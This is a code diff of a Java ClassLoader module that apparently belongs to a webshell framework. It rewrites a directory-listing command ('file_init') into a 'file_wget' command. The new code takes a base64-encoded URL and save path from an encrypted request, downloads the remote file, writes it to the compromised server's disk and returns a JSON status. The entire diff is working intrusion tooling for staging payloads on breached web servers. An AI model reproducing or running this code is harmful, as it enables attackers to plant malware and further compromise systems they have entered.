@@ -1,14 +1,23 @@
-import java.io.*;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.io.PrintWriter;
+import java.io.StringWriter;
 import java.lang.reflect.Method;
-import java.util.ArrayList;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.nio.charset.StandardCharsets;
+import java.util.Base64;
 import java.util.HashMap;
-import java.util.List;
 import java.util.Map;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
-public class file_init extends ClassLoader
+public class file_wget extends ClassLoader
 {
-    public file_init(ClassLoader objParent) { super(objParent); }
-    public file_init() { super(file_init.class.getClassLoader()); }
+    public file_wget(ClassLoader objParent) { super(objParent); }
+    public file_wget() { super(file_wget.class.getClassLoader()); }
 
     private Map<String, String> fnParseParams(String szParamStr)
     {
@@ -56,10 +65,7 @@ public class file_init extends ClassLoader
             Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
             fnFlushBuffer.invoke(objResponse, new Object[0]);
         }
-        catch (Exception exIgnored)
-        {
-
-        }
+        catch (Exception exIgnored) {}
     }
 
     private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
@@ -96,7 +102,7 @@ public class file_init extends ClassLoader
         Object objRequest = null;
         Object objResponse = null;
         OutputStream osClient = null;
-        
+
         try
         {
             Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
@@ -123,95 +129,90 @@ public class file_init extends ClassLoader
             int nParamOffset = nClassLength + 4;
             int nParamLength = abPayload.length - nParamOffset;
             String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();
-
             Map<String, String> mapParams = fnParseParams(szParam);
-            String szSplitter = mapParams.get("splitter");
+            StringBuilder sb = new StringBuilder();
+
+            String z0 = mapParams.get("z0");
+            String z1 = mapParams.get("z1");
+
+            String szURL = new String(Base64.getDecoder().decode(z0), StandardCharsets.UTF_8).trim();
+            String szSaveDir = new String(Base64.getDecoder().decode(z1), StandardCharsets.UTF_8).trim();
+
+            String szFileName = "";
+            HttpURLConnection connection = null;
+            InputStream isRemote = null;
+            FileOutputStream fosLocal = null;
             
-            String szCurrentDir = "";
             try
             {
-                Method fnGetServletContext = objRequest.getClass().getMethod("getServletContext", new Class[0]);
-                Object objServletContext = fnGetServletContext.invoke(objRequest, new Object[0]);
+                URL url = new URL(szURL);
+                connection = (HttpURLConnection)url.openConnection();
+                connection.setRequestMethod("GET");
+                connection.setConnectTimeout(15000);
+                connection.setReadTimeout(15000);
+                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
 
-                Method fnGetRealPath = objServletContext.getClass().getMethod("getRealPath", new Class[]{String.class});
-                String szRootPath = (String) fnGetRealPath.invoke(objServletContext, new Object[]{"/"});
-
-                Method fnGetServletPath = objRequest.getClass().getMethod("getServletPath", new Class[0]);
-                String szServletPath = (String) fnGetServletPath.invoke(objRequest, new Object[0]);
-
-                szRootPath = szRootPath.replace("\\", "/");
-                szServletPath = szServletPath.replace("\\", "/");
-                
-                if (!szRootPath.endsWith("/"))
-                    szRootPath += "/";
-                if (szServletPath.startsWith("/"))
-                    szServletPath = szServletPath.substring(1);
-                
-                String szFullPath = szRootPath + szServletPath;
-
-                szCurrentDir = szFullPath.substring(0, szFullPath.lastIndexOf("/") + 1);
-                szCurrentDir = szCurrentDir.replace("/", java.io.File.separator);
-
-            }
-            catch (Exception e)
-            {
-                try
+                int nRespCode = connection.getResponseCode();
+                if (nRespCode == HttpURLConnection.HTTP_OK)
                 {
-                    Method fnGetServletContext = objRequest.getClass().getMethod("getServletContext", new Class[0]);
-                    Object objServletContext = fnGetServletContext.invoke(objRequest, new Object[0]);
-                    Method fnGetRealPath = objServletContext.getClass().getMethod("getRealPath", new Class[]{String.class});
-                    String szRootPath = (String) fnGetRealPath.invoke(objServletContext, new Object[]{"/"});
-
-                    Method fnGetRequestURI = objRequest.getClass().getMethod("getRequestURI", new Class[0]);
-                    String szURI = (String) fnGetRequestURI.invoke(objRequest, new Object[0]);
-
-                    String szFullPath = szRootPath.replace("\\", "/") + szURI.replace("\\", "/");
-                    szCurrentDir = szFullPath.substring(0, szFullPath.lastIndexOf("/") + 1);
-                    szCurrentDir = szCurrentDir.replace("/", java.io.File.separator);
-                }
-                catch (Exception ex)
-                {
-                    szCurrentDir = System.getProperty("user.dir");
-                }
-            }
-
-            if (szCurrentDir.length() > 1 && szCurrentDir.endsWith(java.io.File.separator)) {
-                szCurrentDir = szCurrentDir.substring(0, szCurrentDir.length() - 1);
-            }
-
-            boolean bIsWindows = System.getProperty("os.name").toLowerCase().contains("win");
-
-            StringBuilder sb = new StringBuilder();
-            
-            sb.append(szCurrentDir);
-            sb.append("|");
-            if (!bIsWindows)
-            {
-                // Unix-like
-                sb.append("/");
-            }
-            else
-            {
-                File[] roots = File.listRoots();
-                if (roots != null)
-                {
-                    List<String> lsDrive = new ArrayList<>();
-                    for (File root : roots)
+                    // Get file name from content-disposition
+                    String szDisposition = connection.getHeaderField("Content-Disposition");
+                    if (szDisposition != null)
                     {
-                        String szPath = root.getAbsolutePath();
-                        if (szPath.endsWith(("\\")))
-                            szPath = szPath.substring(0, szPath.length() - 1);
-
-                        lsDrive.add(szPath);
+                        Pattern p = Pattern.compile("filename=\"?([^\";]+)\"?", Pattern.CASE_INSENSITIVE);
+                        Matcher m = p.matcher(szDisposition);
+                        if (m.find()) {
+                            szFileName = m.group(1);
+                        }
                     }
 
-                    sb.append(String.join(",", lsDrive));
+                    // Get file name from URL
+                    if (szURL == null || szURL.isEmpty()) {
+                        String szPath = url.getPath();
+                        if (szPath != null && !szPath.isEmpty()) {
+                            int nLastSlash = szPath.lastIndexOf('/');
+                            if (nLastSlash >= 0 && nLastSlash < szPath.length() - 1) {
+                                szURL = szPath.substring(nLastSlash + 1);
+                            }
+                        }
+                    }
+
+                    // All failed!
+                    if (szFileName == null || szFileName.isEmpty() || szFileName.equals("/")) {
+                        szFileName = "download.bin";
+                    }
+
+                    // Create directory if it does not exist.
+                    File dir = new File(szSaveDir);
+                    if (!dir.exists()) {
+                        dir.mkdirs();
+                    }
+                    File fileTarget = new File(dir, szFileName);
+                    String szFullSavePath = fileTarget.getAbsolutePath();
+
+                    isRemote = connection.getInputStream();
+                    fosLocal = new FileOutputStream(fileTarget);
+                    byte[] buffer = new byte[4096];
+                    int nBytesRead;
+                    while ((nBytesRead = isRemote.read(buffer)) != -1) {
+                        fosLocal.write(buffer, 0, nBytesRead);
+                    }
+
+                    sb.append("{\"success\":true,\"filename\":\"" + fnEscapeJson(szFileName) + "\",\"path\":\"" + fnEscapeJson(szFullSavePath) + "\"}");
                 }
+                else
+                {
+                    sb.append("{\"success\":false,\"error\":\"HTTP error code: " + nRespCode + "\"}");
+                }
+            } catch (Exception exDownload) {
+                sb.append("{\"success\":false,\"error\":\"Download failed: " + fnEscapeJson(exDownload.getMessage()) + "\"}");
+            } finally {
+                if (fosLocal != null) try { fosLocal.close(); } catch (Exception e) {}
+                if (isRemote != null) try { isRemote.close(); } catch (Exception e) {}
+                if (connection != null) connection.disconnect();
             }
 
-            String szOutput = sb.toString();
-
-            fnWriteOutput(objParam, objResponse, osClient, szOutput.getBytes());
+            fnWriteOutput(objParam, objResponse, osClient, sb.toString().getBytes());
         }
         catch (Exception ex)
         {
@@ -229,5 +230,16 @@ public class file_init extends ClassLoader
         }
 
         return true;
+    }
+
+    private String fnEscapeJson(String str) {
+        if (str == null) return "";
+        return str.replace("\\", "\\\\")
+                  .replace("\"", "\\\"")
+                  .replace("\b", "\\b")
+                  .replace("\f", "\\f")
+                  .replace("\n", "\\n")
+                  .replace("\r", "\\r")
+                  .replace("\t", "\\t");
     }
 }
